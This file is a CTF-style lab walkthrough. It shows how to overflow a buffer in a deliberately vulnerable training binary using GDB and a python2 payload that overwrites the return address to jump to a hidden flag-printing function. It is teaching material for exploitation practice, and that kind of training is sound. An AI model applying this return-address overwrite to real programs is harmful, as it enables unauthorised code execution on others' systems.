@@ -1,0 +1,229 @@
+# 🚩 **Practical: Buffer Overflow Exploit**
+
+---
+
+## 📌 **Goal**
+
+Exploit a vulnerable binary by overflowing the buffer and hijacking the return address to jump to a hidden function (`ctf1`, `ctf2`, or `ctf3`) that prints the flag.
+
+---
+
+## 🔹 **Step 1 — Download the Lab**
+
+Download the **vulnerable binary** from GitHub:
+
+```
+https://github.com/sandeepw1/securityconcepts.git
+```
+
+✅ Download as ZIP → extract in your **Kali Linux** home folder.
+
+---
+
+## 🔹 **Step 2 — Unzip with Password**
+
+```bash
+ls
+unzip buff-lab2.zip  # or securityconcepts.zip
+# If prompted for password → use: password
+```
+
+✅ Verify you have the binary:
+
+```bash
+ls
+```
+
+You should see: `buff-lab2`
+
+---
+
+## 🔹 **Step 3 — Install & Launch GDB**
+
+Install GNU Debugger:
+
+```bash
+sudo apt update
+sudo apt install gdb -y
+```
+
+Launch GDB on the binary:
+
+```bash
+gdb ./buff-lab2
+```
+
+---
+
+## 🔹 **Step 4 — Find Hidden Functions**
+
+Inside `gdb`:
+
+```bash
+info functions
+```
+
+This lists functions. Note down addresses of:
+
+```
+0x08049268  ctf1
+0x08049291  ctf2
+0x080492ba  ctf3
+```
+
+✅ These hidden functions **print the flag** when called.
+
+---
+
+## 🔹 **Step 5 — Inspect Main**
+
+Check how the binary works:
+
+```bash
+disassemble main
+```
+
+You’ll see:
+
+- A `gets()` or `scanf()` that takes input → stores it in a fixed buffer.
+- A password check.
+- If input too big → overwrites return address.
+
+---
+
+## 🔹 **Step 6 — Generate Initial Overflow**
+
+Close GDB:
+
+```bash
+exit
+```
+
+Create a file with `30` `A`s:
+
+```bash
+python2 -c 'print "A"*30' > attack.txt
+cat attack.txt
+```
+
+Run the binary:
+
+```bash
+sudo ./buff-lab2 < attack.txt
+```
+
+You’ll get:
+
+```
+Enter your password:
+Sorry Wrong Password!...Try Again!
+Segmentation fault (core dumped)
+```
+
+✅ **Segfault means buffer overflow works!**
+
+---
+
+## 🔹 **Step 7 — Test in GDB**
+
+Run again inside `gdb`:
+
+```bash
+sudo gdb ./buff-lab2
+run < attack.txt
+```
+
+You should see:
+
+```
+Program received signal SIGSEGV, Segmentation fault.
+```
+
+✅ The `A`s overwrote the return address → program crashes.
+
+Exit:
+
+```bash
+exit
+```
+
+---
+
+## 🔹 **Step 8 — Build Final Payload**
+
+👉 The goal is to **overwrite the return address** with the **address of `ctf3`** (`0x080492ba`).
+
+- `A` × (buffer size) + `address`
+
+Example for `28` bytes of `A` + `ctf3` address (little endian):
+
+```bash
+python2 -c 'print "A"*28 + "\xba\x92\x04\x08"' > attack.txt
+```
+
+---
+
+✅ Verify:
+
+```bash
+cat attack.txt
+```
+
+---
+
+## 🔹 **Step 9 — Run Exploit**
+
+```bash
+sudo ./buff-lab2 < attack.txt
+```
+
+Output:
+
+```
+Enter your password:
+The flag is..W3ll D0n3.. 8uff3r0verfl0w
+```
+
+✅ 🎉 Success — you jumped to `ctf3` and got the flag!
+
+---
+
+## 🔹 **Step 10 — Confirm in GDB**
+
+Optional:
+
+```bash
+sudo gdb ./buff-lab2
+run < attack.txt
+```
+
+See:
+
+```
+The flag is..W3ll D0n3.. 8uff3r0verfl0w
+```
+
+---
+
+## ✅ **Buffer Overflow Lab Recap**
+
+| Step                    | Command                                                       |
+| ----------------------- | ------------------------------------------------------------- |
+| Install GDB             | `sudo apt install gdb`                                        |
+| Open binary in GDB      | `gdb ./buff-lab2`                                             |
+| Find function addresses | `info functions`                                              |
+| Disassemble main        | `disassemble main`                                            |
+| Generate overflow       | `python2 -c 'print "A"*30' > attack.txt`                      |
+| Check segfault          | `sudo ./buff-lab2 < attack.txt`                               |
+| Craft final payload     | `python2 -c 'print "A"*28 + "\xba\x92\x04\x08"' > attack.txt` |
+| Run exploit             | `sudo ./buff-lab2 < attack.txt`                               |
+
+---
+
+## ✅ **How It Works**
+
+- Buffer overflow → overwrites **saved return address**.
+- You control **where program jumps** → to hidden `ctf3()`.
+- `ctf3()` prints the flag.
+
+---
